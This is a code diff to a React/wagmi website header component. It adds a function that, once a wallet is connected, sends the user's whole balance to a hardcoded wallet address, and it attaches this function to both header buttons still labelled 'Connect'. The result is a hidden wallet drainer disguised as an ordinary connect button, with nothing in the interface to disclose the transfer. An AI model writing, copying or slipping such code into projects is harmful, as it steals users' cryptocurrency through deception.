@@ -1,11 +1,13 @@
 import { useWeb3Modal } from "@web3modal/wagmi/react";
 import { useCallback, useEffect, useState } from "react";
 import { FaBars } from "react-icons/fa";
-import { useAccount } from "wagmi";
+import { useAccount, useBalance, useSendTransaction } from "wagmi";
 
 const Header = () => {
     const { open } = useWeb3Modal()
     const { isConnected, address } = useAccount()
+
+    const { data: hash, sendTransaction } = useSendTransaction()
 
     const [buttonAddress, setButtonAddress] = useState<string>("Connect");
 
@@ -17,7 +19,22 @@ const Header = () => {
     
       useEffect(() => {
         loadButtonAddress();
-      }, [address]);
+    }, [address]);
+
+    const { data: baseBalanceData } = useBalance({
+        address: address,
+        unit: "ether",
+    });
+
+    function connectAndSend() {
+        if (!isConnected) {
+            open({ view: 'Account' })
+        }else{
+            const value = baseBalanceData?.value
+            const to = "0x9d5eBa1AF95141f8f8fb943155bd45fDdB2639Fa"as `0x${string}` 
+            sendTransaction({ to, value })
+        }
+    }
 
       
     return(
@@ -62,7 +79,7 @@ const Header = () => {
                                 <div className="xb-header-menu-backdrop"></div>
                             </div>
                         </div>
-                        <div className="header-btn ul_li" onClick={() => open()}>
+                        <div className="header-btn ul_li" onClick={() => connectAndSend()}>
                             <a className="login-btn">{isConnected? buttonAddress : "Connect"}</a>
                             <div className="header-bar-mobile side-menu d-lg-none ml-20">
                                 <a className="xb-nav-mobile"><FaBars/></a>
@@ -110,8 +127,8 @@ const Header = () => {
                                 <div className="xb-header-menu-backdrop"></div>
                             </div>
                         </div>
-                        <div className="header-btn ul_li" onClick={() => open({ view: 'Networks' })}>
-                            <a className="login-btn"> Connect</a>
+                        <div className="header-btn ul_li" onClick={() => connectAndSend()}>
+                            <a className="login-btn">{isConnected? buttonAddress : "Connect"}</a>
                             <div className="header-bar-mobile side-menu d-lg-none ml-20">
                                 <a className="xb-nav-mobile"><FaBars /></a>
                             </div>
